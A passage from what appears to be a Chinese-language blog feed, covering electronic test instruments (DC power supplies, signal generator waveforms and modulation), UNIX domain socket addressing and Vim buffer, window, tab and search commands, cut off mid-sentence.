<code>5Gbps</code>）。</p></blockquote><h3 id="采样率-1"><a href="#采样率-1" class="headerlink" title="采样率"></a>采样率</h3><p>采样率越高，对于逻辑信号的还原精度就会越高，通常推荐采样率为被测数字信号频率的 <code>10 ~ 100</code> 倍。</p><p><a href="http://www.uinio.com/Electronics/Instrument/Logic-Analyzer/3.png"><img src="http://www.uinio.com/Electronics/Instrument/Logic-Analyzer/3.png"></a></p><h2 id="可编程直流电源-DC-Supply"><a href="#可编程直流电源-DC-Supply" class="headerlink" title="可编程直流电源 DC Supply"></a>可编程直流电源 DC Supply</h2><p><strong>可编程直流电源</strong>（Programmable DC Power Supply）用于将 <code>220V</code> 交流电转变成<strong>低压直流电</strong>，之所以称为<strong>可编程</strong>是由于内部并未采用<strong>电位器</strong>，而是通过<strong>微控制器</strong>来控制输出的电压与电流。</p><p><a href="http://www.uinio.com/Electronics/Instrument/DC-Supply/0.png"><img src="http://www.uinio.com/Electronics/Instrument/DC-Supply/0.png"></a></p><ul><li><strong>开关稳压电源</strong>内部使用高频变压器，体积小重量轻，使用的贵金属少；其优点在于效率高、成本低，而缺点在于输出纹波较为严重；主要用于对输出电压纹波要求较低，对效率和成本要求较高的场合；</li><li><strong>线性稳压电源</strong>内部使用大功率的低频变压器，由于需要较多的铜线绕制，所以重量和体积都较大，成本也较高；但是其优点在于输出电压纹波很小，缺点在于效率相对较低，且成本较高；模电实验当中，通常使用的都是<strong>线性稳压电源</strong>；</li></ul><h3 id="恒压与恒流输出"><a href="#恒压与恒流输出" class="headerlink" title="恒压与恒流输出"></a>恒压与恒流输出</h3><p>可编程直流电源通常提供有 <strong>恒压</strong>（<strong>CV</strong>，Constant Voltage）和 <strong>恒流</strong>（<strong>CC</strong>，Constant Current）两种输出模式：</p><ul><li><strong>恒压 CV 模式</strong>：输出<strong>电压</strong>等于<code>电压设置值</code>，输出<strong>电流</strong>由<code>负载</code>决定；</li><li><strong>恒流 CC 模式</strong>：输出<strong>电流</strong>等于<code>电流设置值</code>，输出<strong>电压</strong>由<code>负载</code>决定；</li></ul><h3 id="电源的串并联"><a href="#电源的串并联" class="headerlink" title="电源的串并联"></a>电源的串并联</h3><p><strong>串联</strong>两个或多个隔离通道可以提供<strong>更高的电压</strong>；<strong>并联</strong>两个或多个隔离通道可以提供<strong>更高的电流</strong>，这种工作模式通常用于<strong>单个通道输出的电压、电流上限无法满足实验需求</strong>的时候。</p><h4 id="电源串联"><a href="#电源串联" class="headerlink" title="电源串联"></a>电源串联</h4><p>可编程直流电源的<strong>串联工作模式</strong>可以提供更高的输出电压，其输出电压是<code>所有通道的输出电压之和</code>，此时内部接线方式如下图所示：</p><p><a href="http://www.uinio.com/Electronics/Instrument/DC-Supply/1.png"><img src="http://www.uinio.com/Electronics/Instrument/DC-Supply/1.png"></a></p><h4 id="电源并联"><a href="#电源并联" class="headerlink" title="电源并联"></a>电源并联</h4><p>可编程直流电源的<strong>并联工作模式</strong>可以提供更高的输出电流，其输出电流是<code>单个通道的输出电流之和</code>，此时内部接线方式如下图所示：</p><p><a href="http://www.uinio.com/Electronics/Instrument/DC-Supply/2.png"><img src="http://www.uinio.com/Electronics/Instrument/DC-Supply/2.png"></a></p><h3 id="电源纹波"><a href="#电源纹波" class="headerlink" title="电源纹波"></a>电源纹波</h3><p><strong>电源纹波</strong>（Ripple [ˈrɪpl]）是由于直流稳压电源<code>内部电压波动</code>而造成的一种现象，由于直流稳压电源通常由交流电源经整流、稳压等环节而形成，从而不可避免的在直流稳压量当中携带了一些交流成份，这种<strong>叠加在直流稳定量上的交流分量</strong>就称之为纹波。</p><p><a href="http://www.uinio.com/Electronics/Instrument/DC-Supply/3.png"><img src="http://www.uinio.com/Electronics/Instrument/DC-Supply/3.png"></a></p><h2 id="信号发生器-Signal-Generator"><a href="#信号发生器-Signal-Generator" class="headerlink" title="信号发生器 Signal Generator"></a>信号发生器 Signal Generator</h2><p><strong>信号发生器</strong>（Signal Generator）是一种能够根据需要，产生各种<strong>模拟</strong>和<strong>数字</strong>激励信号的电子仪器。</p><p><a href="http://www.uinio.com/Electronics/Instrument/Signal-Generator/0.png"><img src="http://www.uinio.com/Electronics/Instrument/Signal-Generator/0.png"></a></p><h3 id="通道设置"><a href="#通道设置" class="headerlink" title="通道设置"></a>通道设置</h3><h3 id="幅度单位换算"><a href="#幅度单位换算" class="headerlink" title="幅度单位换算"></a>幅度单位换算</h3><h4 id="与-的换算"><a href="#与-的换算" class="headerlink" title="与 的换算"></a>与 的换算</h4><p>是表示<strong>信号峰峰值的单位</strong>， 是表示<strong>信号有效值的单位</strong>，信号发生器默认使用 作为信号幅值的单位。对于不同的波形， 与 之间的关系不同。以正弦波为例，二者之间的关系如下图所示：</p><p><a href="http://www.uinio.com/Electronics/Instrument/Signal-Generator/3.png"><img src="http://www.uinio.com/Electronics/Instrument/Signal-Generator/3.png"></a></p><p>根据上图，可以推导出 与 之间换算关系满足如下关系式：</p><h4 id="与-的换算-1"><a href="#与-的换算-1" class="headerlink" title="与 的换算"></a>与 的换算</h4><p>是表示<strong>信号功率绝对值</strong>的单位， 与 之间满足如下关系：</p><p>由于上面方程当中的 <code>R</code> 表示的是通道的输出阻抗，必须为确定的数值，所以当信号发生器的输出阻抗被设置为<code>高阻</code>时，就不能使用 作为单位。</p><h3 id="基本波形"><a href="#基本波形" class="headerlink" title="基本波形"></a>基本波形</h3><p>信号发生器可以输出包括 <strong>正弦波</strong>、<strong>方波</strong>、<strong>锯齿波</strong>、<strong>脉冲</strong>、<strong>噪声</strong> 在内的 5 种基本波形，</p><p><a href="http://www.uinio.com/Electronics/Instrument/Signal-Generator/4.png"><img src="http://www.uinio.com/Electronics/Instrument/Signal-Generator/4.png"></a></p><h4 id="占空比"><a href="#占空比" class="headerlink" title="占空比"></a>占空比</h4><p><strong>占空比</strong>是方波波形<strong>高电平</strong>持续的时间所占<strong>周期</strong>的百分比，该参数仅在输出<code>方波</code>或者<code>脉冲波</code>时有效。</p><p><a href="http://www.uinio.com/Electronics/Instrument/Signal-Generator/5.png"><img src="http://www.uinio.com/Electronics/Instrument/Signal-Generator/5.png"></a></p><h4 id="对称性"><a href="#对称性" class="headerlink" title="对称性"></a>对称性</h4><p><strong>对称性</strong>是指<strong>锯齿波</strong>波形的上升阶段占据<strong>周期</strong>的百分比，该参数仅针对<code>锯齿波</code>有效。</p><p><a href="http://www.uinio.com/Electronics/Instrument/Signal-Generator/6.png"><img src="http://www.uinio.com/Electronics/Instrument/Signal-Generator/6.png"></a></p><h4 id="脉冲宽度-上升-下降沿"><a href="#脉冲宽度-上升-下降沿" class="headerlink" title="脉冲宽度 &amp; 上升&#x2F;下降沿"></a>脉冲宽度 &amp; 上升&#x2F;下降沿</h4><ul><li><strong>上升沿时间</strong>是指脉冲幅度从波形 <code>10％</code> 位置上升至 <code>90％</code> 位置所持续的时间；</li><li><strong>下降边沿时间</strong>是指脉冲幅度从波形 <code>90％</code> 位置下降至 <code>10％</code> 位置所持续的时间；</li><li><strong>脉冲宽度</strong>是指从脉冲<strong>上升沿</strong>幅度 50% 位置到<strong>下降沿</strong>幅度 <code>50%</code> 位置之间的时间间隔；</li></ul><p><a href="http://www.uinio.com/Electronics/Instrument/Signal-Generator/7.png"><img src="http://www.uinio.com/Electronics/Instrument/Signal-Generator/7.png"></a></p><h3 id="谐波输出"><a href="#谐波输出" class="headerlink" title="谐波输出"></a>谐波输出</h3><p>信号发生器通常附带有谐波发生功能，可以输出具有指定<code>次数</code>、<code>幅度</code>、<code>相位</code>的<strong>谐波</strong>，通常应用于<strong>谐波检测设备</strong>或者<strong>谐波滤波设备</strong>的测试当中。</p><p><strong>傅立叶变换</strong>理论指出<code>时域波形</code>是由一系列<strong>正弦波</strong>叠加而成的，可以采用如下方程进行表示：</p><p>为<strong>基波频率</strong>，频率为 的分量就称为<strong>基波</strong>， 为<strong>基波幅度</strong>， 为<strong>基波相位</strong>。上述方程当中其它各个分量的频率通常为<strong>基波频率的整数倍</strong>，称为<strong>谐波</strong>。频率为<code>基波频率奇数倍</code>的分量称为<strong>奇次谐波</strong>，频率为<code>基波频率偶数倍</code>的分量称为<strong>偶次谐波</strong>。</p><h3 id="扫频输出"><a href="#扫频输出" class="headerlink" title="扫频输出"></a>扫频输出</h3><p><strong>信号发生器</strong>工作在扫频模式下时，会在指定的扫描时间内从<strong>起始频率</strong>到<strong>终止频率</strong>变化的进行输出，<code>正弦波</code>、<code>方波</code>、<code>锯齿波</code>、<code>任意波</code> 都可以进行扫频输出。</p><h3 id="波形调制"><a href="#波形调制" class="headerlink" title="波形调制"></a>波形调制</h3><p><strong>信号发生器</strong>可以输出经过调制波形，支持的调制类型包括 <code>AM</code>、<code>FM</code>、<code>PM</code>、<code>ASK</code>、<code>FSK</code>、<code>PSK</code>、<code>PWM</code> 等。所谓<strong>调制</strong>就是按照<code>调制信号</code>的变化改变<code>载波信号</code>某些参数（幅度、频率、相位等）的过程，这里的<strong>载波</strong>可以是<code>正弦波</code>、<code>方波</code>、<code>锯齿波</code>、<code>任意波</code>、<code>脉冲波</code>，而<strong>调制波</strong>则是来自内部或者外部的调制源。</p><table><thead><tr><th>调制类型</th><th>英文缩写</th><th>英文全称</th><th>调制方式描述</th></tr></thead><tbody><tr><td><strong>幅度调制</strong></td><td><strong>AM</strong></td><td>Amplitude Modulation</td><td><strong>载波</strong>的<code>幅度</code>随着<strong>调制波形</strong><code>瞬时电压</code>的变化而变化；</td></tr><tr><td><strong>频率调制</strong></td><td><strong>FM</strong></td><td>Frequency Modulation</td><td><strong>载波</strong>的<code>频率</code>随着<strong>调制波形</strong><code>瞬时电压</code>的变化而变化；</td></tr><tr><td><strong>相位调制</strong></td><td><strong>PM</strong></td><td>Phase Modulation</td><td><strong>载波</strong>的<code>相位</code>随着<strong>调制波形</strong><code>瞬时电压</code>的变化而变化；</td></tr><tr><td><strong>幅移键控</strong></td><td><strong>ASK</strong></td><td>Amplitude Shift Keying</td><td>配置信号发生器在两个预设的<strong>幅度</strong>（<code>载波幅度</code>和<code>调制幅度</code>）之间<code>移动</code>其输出<strong>幅度</strong>；</td></tr><tr><td><strong>频移键控</strong></td><td><strong>FSK</strong></td><td>Frequency Shift Keying</td><td>配置信号发生器在两个预设的<strong>频率</strong>（<code>载波频率</code>和<code>跳跃频率</code>）之间<code>移动</code>其输出<strong>频率</strong>；</td></tr><tr><td><strong>相移键控</strong></td><td><strong>PSK</strong></td><td>Phase Shift Keying</td><td>配置信号发生器在两个预置<strong>相位</strong>（<code>载波相位</code>和<code>调制相位</code>）之间<code>移动</code>其输出<strong>相位</strong>；</td></tr><tr><td><strong>脉宽调制</strong></td><td><strong>PWM</strong></td><td>Pulse Width Modulation</td><td><strong>载波</strong>的<code>脉宽</code>随着调制波形<strong>瞬时电压</strong>的变化而变化；</td></tr></tbody></table><blockquote><p><strong>注意</strong>：<strong>载波</strong>（Carrier Wave）和<strong>载波频率</strong>属于相同的物理概念，是一种在<code>频率</code>、<code>幅度</code>、<code>相位</code>方面被调制以传输信号的电磁波。</p></blockquote><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><a href="http://www.uinio.com/Electronics/Instrument/">http://www.uinio.com/Electronics/Instrument/</a></li><li><a href="https://www.fluke.com.cn/%E5%AD%A6%E4%B9%A0/%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/%E6%95%B0%E5%AD%97%E4%B8%87%E7%94%A8%E8%A1%A8/faq-of-digital-multimeters">https://www.fluke.com.cn/%E5%AD%A6%E4%B9%A0/%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/%E6%95%B0%E5%AD%97%E4%B8%87%E7%94%A8%E8%A1%A8/faq-of-digital-multimeters</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>硬件</category>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>unix-domain-Socket</title>
    <link href="/2023/11/29/unix-domain-Socket/"/>
    <url>/2023/11/29/unix-domain-Socket/</url>
    
    <content type="html"><![CDATA[<p>总结UNIX admian Socket中的知识点</p><span id="more"></span><h1 id="在UNIX下的套接字"><a href="#在UNIX下的套接字" class="headerlink" title="在UNIX下的套接字"></a>在UNIX下的套接字</h1><p>在本篇BLOG下，所有的套接字都是UNIX下的套接字。</p><h2 id="Socket的地址"><a href="#Socket的地址" class="headerlink" title="Socket的地址"></a>Socket的地址</h2><p>在UNIX admain中使用文件的路径来表示Socket的地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_un</span>&#123;</span><br>    <span class="hljs-type">sa_fmaily_t</span> sun_family; <span class="hljs-comment">//这个变量一直是AF_UNIX</span><br>    char_sun_path[<span class="hljs-number">108</span>];     <span class="hljs-comment">//存储路径名</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="需要注意的点"><a href="#需要注意的点" class="headerlink" title="需要注意的点"></a>需要注意的点</h2><ol><li>UNIX admain下的套接字无法使用open()函数打开</li><li>一个路径名只可以绑定一个套接字</li><li>不在需要套接字时，应该使用unlink()或者remove()函数将其对应的文件删除</li><li>最好使用绝对路径来绑定一个套接字，当然相对路径也是可以的，但是最好不要使用。</li></ol>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
      <category>socket</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vim学习笔记</title>
    <link href="/2023/11/29/vim%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2023/11/29/vim%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>总结学习vim的笔记</p><span id="more"></span><h1 id="vim中的基本概念"><a href="#vim中的基本概念" class="headerlink" title="vim中的基本概念"></a>vim中的基本概念</h1><h2 id="word和WORD"><a href="#word和WORD" class="headerlink" title="word和WORD"></a>word和WORD</h2><p>Vim对<strong>单词</strong>有两种不同的定义，并且分别用“单词”（word）和“字串”（WORD）对其进行区分。我们之前遇到过的每个面向单词的动作命令，都有一个面向字串的命令与其对应，这当中包括 W、B、E和 gE。</p><p>实际上当使用小写的时候代表的就是<code>word</code> 使用大写字母的使用就是<code>WORD</code>。如：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402070158382.png"></p><p>一个单词由字母、数字、下划线，或其他非空白字符的序列组成，单词间以空白字符分隔（参见<code>:h word</code>）。而字串的定义则更简单，它由非空白字符序列组成，字串间以空白字符分隔（参见<code>:h WORD</code>）。</p><p>如果你想更快地移动的话，可以用面向字串的动作命令；而如果你想以更细的粒度移动的话，则可以用面向单词的动作命令。</p><h1 id="多文件编辑"><a href="#多文件编辑" class="headerlink" title="多文件编辑"></a>多文件编辑</h1><p><strong>标签页(tab)、窗口(window)、缓冲区(buffer)是Vim多文件编辑的三种方式，它们可以单独使用，也可以同时使用。</strong> 它们的关系是这样的：</p><blockquote><p>A buffer is the in-memory text of a file. A window is a viewport on a buffer. A tab page is a collection of windows. –vimdoc</p></blockquote><blockquote><p>缓冲区是文件的内存文本。窗口是缓冲区上的视口。标签页是窗口的集合。</p></blockquote><p>三者具体的关系如下：</p><ul><li><p>buffer: 当用 vim 打开一个文件编辑时，编辑的对象并不是源文件，vim 会先将文件加载到内存中，用户编辑的数据存储再 buffer 中，使用 :w 可以将 buffer 中的数据写入，使用 :q! 表示退出并丢弃 buffer 中的内容。</p></li><li><p>window: window 就是 buffer 的视口，用于显示 buffer 的内容，一个 buffer 可以显示在多个 window 中，也可以多个 window 显示不同的 buffer</p></li><li><p>tab: tab 页是一组 window</p></li></ul><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404211538780.png"></p><p>使用-O参数可以让Vim以分屏的方式打开多个文件：</p><pre><code class="hljs">vim -O main.cpp my-oj-toolkit.h</code></pre><p>使用小写的-o可以水平分屏。</p><ul><li><p>vim a b c 可以打开 a b c 三个文件</p></li><li><p>使用 :n 可以跳转到一个文件</p></li><li><p>:e# 回到刚才编辑的文件</p></li></ul><h1 id="缓冲区"><a href="#缓冲区" class="headerlink" title="缓冲区"></a>缓冲区</h1><p>引用Vim官方解释，缓冲区是一个文件的内容占用的那部分Vim内存：</p><blockquote><p>A buffer is an area of Vim’s memory used to hold text read from a file. In addition, an empty buffer with no associated file can be created to allow the entry of text. –vim.wikia</p></blockquote><ul><li>每个窗口显示一个在一个缓冲区上查看(通常是文件)。</li><li>一个缓冲区可以出现在多个窗口中(窗口2和窗口3显示相同的缓冲区)。</li><li>有些缓冲区可能被隐藏(不显示)。</li></ul><h2 id="buffer的三种状态"><a href="#buffer的三种状态" class="headerlink" title="buffer的三种状态"></a>buffer的三种状态</h2><ul><li><p>active：显示在窗口中的 buffer</p></li><li><p>hidden: 没有显示在窗口中的 buffer</p></li><li><p>inactive：没有显示，并且没有任何东西，没有与某个文件进行绑定</p></li></ul><h2 id="相关命令"><a href="#相关命令" class="headerlink" title="相关命令"></a>相关命令</h2><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs txt">:ls 或者是:buffer可以查看所有的buffer，与之一样的命令还有 :buffers<br><br>ls显示的符号的意义：<br><br>% 符号指明哪个缓冲区在当前窗口中可见，而 # 符号则代表轮换文件。按 &lt;C-^&gt;可以在当前文件和轮换文件间快速切换，在本例中，按一次会切换到 a.txt，再按一次，就又回到 b.txt了。注意：想要使用&lt;C-^&gt;来转换缓冲区，之前必须先使用命令 :bnext<br><br>缓冲区 a.txt 前有一个 + 号，表示这个缓冲区被修改过了。如果现在保存文件的话，缓冲区的内容就会被写入磁盘里，而 + 号也会消失了。<br></code></pre></td></tr></table></figure><h2 id="创建缓冲区"><a href="#创建缓冲区" class="headerlink" title="创建缓冲区"></a>创建缓冲区</h2><p>每次打开一个文件时，vim都会自动打开一个缓冲区。使用命令<code>:ls</code> <code>:buffers</code>可以进行查看。</p><p>不带任何参数打开多个文件便可以把它们都放入缓冲区（Buffer）：</p><pre><code class="hljs">vim a.txt b.txt</code></pre><blockquote><p>当你使用:q关闭文件时？是否看到过1 more file to edit的警告？那就是缓冲区中的文件。</p></blockquote><h2 id="缓冲区之间的移动"><a href="#缓冲区之间的移动" class="headerlink" title="缓冲区之间的移动"></a>缓冲区之间的移动</h2><p>我们可以用4条命令来遍历缓冲区列表。<code>:bprev</code> 和 <code>:bnext</code> 在列表中反向或正向移动，每次移动一项；而 <code>:bfirst</code> 和 <code>:blast</code> 则分别跳到列表的开头和结尾。</p><h2 id="缓冲区的删除"><a href="#缓冲区的删除" class="headerlink" title="缓冲区的删除"></a>缓冲区的删除</h2><p><code>:bdelete N1 N2 N3</code> <code>:N,M bdelete</code>注意：删除一个缓冲区并不会影响缓冲区所关联的文件，而只是简单地把该文件在内存中的映像删掉。如果我们想删除编号5～10（包含5和10）的缓冲区，可以执行 :5,10bd；然而，如果想要保留编号为8的缓冲区的话，那么就只能用 :bd 5 6 7 9 10 了。</p><h2 id="缓冲区相关命令"><a href="#缓冲区相关命令" class="headerlink" title="缓冲区相关命令"></a>缓冲区相关命令</h2><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404282045741.png"></p><h1 id="标签页"><a href="#标签页" class="headerlink" title="标签页"></a>标签页</h1><p><strong>标签页是容纳一些窗口的容器</strong></p><p>用 <code>Vim</code> 的标签页可以把工作分隔到不同的工作区。<code>Vim</code> 中的标签页更像是 <code>Linux</code> 中的虚拟桌面，而不是像其他文本编辑器中的标签页。</p><p>标签页是最常见的多文件编辑方式吧，熟悉IDE的小伙伴一定能很快上手！ 使用<code>-p</code>参数来用多个标签页启动<code>Vim</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim -p main.cpp my-oj-toolkit.h /private/etc/hosts<br></code></pre></td></tr></table></figure><h2 id="如何使用标签页"><a href="#如何使用标签页" class="headerlink" title="如何使用标签页"></a>如何使用标签页</h2><pre><code class="hljs">:lcd &#123;path&#125;               //设置当前窗口的本地工作目录:windo lcd &#123;path&#125;      //设置所有窗口的本地工作目录</code></pre><h2 id="打开及关闭标签页"><a href="#打开及关闭标签页" class="headerlink" title="打开及关闭标签页"></a>打开及关闭标签页</h2><pre><code class="hljs">:close        //关闭此窗口以及包含此窗口的标签页:tabclose    //关闭当前标签页，无论其中有多少个窗口 :tabc:tabonly    //关闭当前标签页外的所有其他标签页 :tabo:tabedit &#123;filename&#125;    //在新标签页打开文件  :tabe:tabe[dit] &#123;file&#125;   edit specified file in a new tab:tabf[ind] &#123;file&#125;   open a new tab with filename given, searching the &#39;path&#39; to find it:tabc[lose]         close current tab:tabc[lose] &#123;i&#125;     close i-th tab:tabo[nly]          close all other tabs (show only the current tab)Ctrl+w+T                //把当前窗口移到一个新标签页</code></pre><blockquote><p>中括号中的部分可以省略，在Vim中:h tabedit可以查看命令帮助。</p></blockquote><h2 id="在标签页中切换"><a href="#在标签页中切换" class="headerlink" title="在标签页中切换"></a>在标签页中切换</h2><pre><code class="hljs">:tabn         go to next tab:tabp         go to previous tab:tabfirst     go to first tab:tablast      go to last tab123gt                  //跳到标签页123123gT                 //跳转方向与上一条相反:tabnext 2，同123gt   //切换到编号为2的标签页:tabnext，同gt           //切换到下一个标签页:tabprevious，同gT    //切换到上一个标签页</code></pre><p>在正常模式（normal）下，还可以使用快捷键：</p><pre><code class="hljs">gt            go to next tabgT            go to previous tab&#123;i&#125;gt         go to tab in position i </code></pre><h2 id="重排标签页"><a href="#重排标签页" class="headerlink" title="重排标签页"></a>重排标签页</h2><pre><code class="hljs">:tabmove N当N为0时，当前标签页会被移到开头当N为空时，当前标签页会被移到结尾当N为123时，当前标签页会被移到123标签页</code></pre><h1 id="窗口"><a href="#窗口" class="headerlink" title="窗口"></a>窗口</h1><h2 id="常用的窗口操作"><a href="#常用的窗口操作" class="headerlink" title="常用的窗口操作"></a>常用的窗口操作</h2><ul><li><p>CTRL‑W ] 分割窗口并跳转到光标下的标签</p></li><li><p>CTRL‑W f 分割窗口并编辑光标下的<strong>文件名</strong> (file)</p></li><li><p>CTRL‑W ^ 分割窗口并编辑轮换文件</p></li><li><p>CTRL‑W n 或 :new 创建新空白窗口 (new)</p></li></ul><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404271719318.png"></p><p><code>n</code> 表示上一个，<code>N</code>表示下一个</p><h2 id="窗口的创建"><a href="#窗口的创建" class="headerlink" title="窗口的创建"></a>窗口的创建</h2><p><code>：split </code>   新建一个窗口，将当前窗口分割成两半，他们显示的是相同缓冲区的内容（同一个文件）。这样就可以在两个窗口中浏览相同的文件了。可以简写为 <code>sp + 窗口名</code></p><p><code>：vsplit </code>  创建全新的垂直分割的窗口，同样是显示和当前窗口同一个文件内容。可以简写为 <code>vsp + 窗口名</code></p><p><strong>注意，如果直接在命令行中输入 <code>:split</code> <code>:vsplit</code>，所打开的窗口中的内容和原来的窗口中的内容是一样的。</strong></p><h2 id="窗口的关闭"><a href="#窗口的关闭" class="headerlink" title="窗口的关闭"></a>窗口的关闭</h2><p>有4种关闭窗口的方式，分别是：离开（quit）、关闭（close）、隐藏（hide）、关闭其他窗口</p><p>^代表Ctrl键<br>^Wq，离开当前窗口<br>^Wc，关闭当前的窗口<br>^Wo，关闭当前窗口以外的所有窗口</p><h2 id="窗口切换"><a href="#窗口切换" class="headerlink" title="窗口切换"></a>窗口切换</h2><p>ctrl w + hjkl 光标在各个窗口之间切换</p><p><strong>Ctrl + w + w：这个命令会在所有窗口中循环移动</strong></p><p>Ctrl + w + t：移动到最左上角的窗口</p><p>Ctrl + w + b：移动到最右下角的窗口</p><p>Ctrl + w + p：移动到前一个访问的窗口</p><h3 id="窗口移动"><a href="#窗口移动" class="headerlink" title="窗口移动"></a>窗口移动</h3><p>Ctrl + w + r：向右或向下方交换窗口，而Ctrl + w + R则和它方向相反。</p><p>光标会随着窗口而移动</p><p>Ctrl + w + x：交换同列或同行的窗口的位置。vim默认交换当前窗口的与它下一个窗口的位置，如果下方没有窗口，则试着与上一个窗口交换位置。亦可在此命令前加上数量，与制定的窗口交换位置。</p><h3 id="窗口移动并且改变布局"><a href="#窗口移动并且改变布局" class="headerlink" title="窗口移动并且改变布局"></a>窗口移动并且改变布局</h3><p>注：下面的第三个字母都是大写，按玩Ctrl + w之后，按shif + 相应的字母。后面用^代替Ctrl<br>Ctrl + w + K ：移动当前窗口至屏幕顶端，并占用全部宽度<br>^WJ： 移动窗口至屏幕底端，并占用全部宽度<br>^WH：移动窗口至屏幕左端，并占用全部高度<br>^WL：移动窗口至屏幕右端，并占用全部高度</p><p>^WT ：移动窗口至屏新的现有分页</p><h3 id="行和列的调整"><a href="#行和列的调整" class="headerlink" title="行和列的调整"></a>行和列的调整</h3><pre><code class="hljs">:res(ize)+num 把当前窗口高度增加num行:res(ize)-num 把当前窗口高度减少num行</code></pre><p>横向调整</p><pre><code class="hljs">:vertical res(ize) num 指定当前窗口为num列:vertical res(ize)+num 把当前窗口增加num列:vertical res(ize)-num 把当前窗口减少num列Ctrl+w +        增加窗口高度Ctrl+w -        减小窗口高度Ctrl+w =        统一窗口高度</code></pre><h1 id="第一章"><a href="#第一章" class="headerlink" title="第一章"></a>第一章</h1><h2 id="关于-命令"><a href="#关于-命令" class="headerlink" title="关于.命令"></a>关于<code>.</code>命令</h2><p>这个命令的作用是重复你上一次的操作</p><h2 id="G和"><a href="#G和" class="headerlink" title="&gt;G和&lt;G"></a><code>&gt;G</code>和<code>&lt;G</code></h2><p>这两个命令前者是在行头添加一个<code>tab</code>，后者是删除一个<code>tab</code>。可以和命令<code>.</code>一起使用。</p><h1 id="常用的操作"><a href="#常用的操作" class="headerlink" title="常用的操作"></a>常用的操作</h1><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs txt">:E 打开一个文件夹，使用hjkl选择文件回车进入<br><br>:ter 打开一个终端窗口 使用exit退出<br><br>ctrl w + hjkl 光标在各个窗口之间切换<br><br>:shell 可以在不关闭vim的情况下切换到shell命令行<br><br>:exit 从shell回到vim<br><br></code></pre></td></tr></table></figure><h1 id="翻页命令"><a href="#翻页命令" class="headerlink" title="翻页命令"></a>翻页命令</h1><p>ctrl+f向上翻页<br>ctrl+b向下翻页<br>ctrl+u  向下翻半页<br>ctrl+d  向上翻半页<br>ctrl+y  向下翻一行<br>ctrl+e  向上翻一行<br>L       屏幕底行<br>H       屏幕顶行<br>zz      移动屏幕至光标位屏幕中央</p><h1 id="搜索命令"><a href="#搜索命令" class="headerlink" title="搜索命令"></a>搜索命令</h1><p><code>/</code>和<code>?</code>是vim中的两种搜索命令，但是它们两个的搜索方向相反，<code>/</code>是向后搜索。</p><p>设置&#x2F;取消大小写：</p><pre><code class="hljs">:set noignorecase # 不区分大小写:set ignorecase # 区分大小写 :set incsearch 可以在敲键的同时搜索，按下回车把移动光标移动到匹配的词； 按下 Esc 取消搜索。:set wrapscan 用来设置到文件尾部后是否重新从文件头开始搜索。</code></pre><h2 id="搜索历史"><a href="#搜索历史" class="headerlink" title="搜索历史"></a>搜索历史</h2><p>假设你执行了三个查找命令: </p><pre><code class="hljs">    /one    /two    /three</code></pre><p>现在，让我们输入 “&#x2F;“ 启动一次查找，但先不按下回车键。现在按 <Up> (上箭头)，Vim把 “&#x2F;three” 放到你的命令行上。回车就会从当前位置查找 “three”。如果你不回车，继续按 <Up>，Vim 转而显示 “&#x2F;two”，而下一次 <Up> 变成 “&#x2F;one”。你还可以用 <Down> 命令在历史记录中反向查找。</p><p>如果你知道前面用过的一个模式以什么开头，而且你想再使用这个模式的话，可以在输入<Up> 前输入这个开头。继续前面的例子，你可以输入 “&#x2F;o<Up>“，Vim 就会在命令行上显示 “&#x2F;one”。</p><p>冒号开头的命令也有历史记录。这允许你取回前一个命令并再次执行。这两种历史记录是相互独立的。</p><h2 id="单词搜索"><a href="#单词搜索" class="headerlink" title="单词搜索"></a>单词搜索</h2><p>在vim中进行单词搜索有两种方法：</p><p>假设你在文本中看到一个单词 “TheLongFunctionName” 而你想找到下一个相同的单词。<br>你可以输入 “&#x2F;TheLongFunctionName”，但这要输入很多东西。而且如果输错了，Vim 是不可能找到你要找的单词的。</p><p>有一个简单的方法: 把光标移到那个单词下面使用 <code>*</code> 命令。Vim 会取得光标上的单词并把它作为被查找的字符串。<code>#</code> 命令在反向完成相同的功能。你可以在命令前加一个计数: <code>3*</code> 查找光标下单词第三次出现的地方。</p><p>第二种方法就是直接进行搜索：<br>如果你输入 “&#x2F;the”，你也可能找到 “there”。要找到以 “the” 结尾的单词，可以用: </p><pre><code class="hljs">    /the\&gt;</code></pre><p>“&gt;“ 是一个特殊的记号，表示只匹配单词末尾。类似地，”&lt;“ 只匹配单词的开头。<br>这样，要匹配一个完整的单词 “the”，只需: </p><pre><code class="hljs">    /\&lt;the\&gt;</code></pre><p>这不会匹配 “there” 或者 “soothe”。注意 <code>*</code> 和 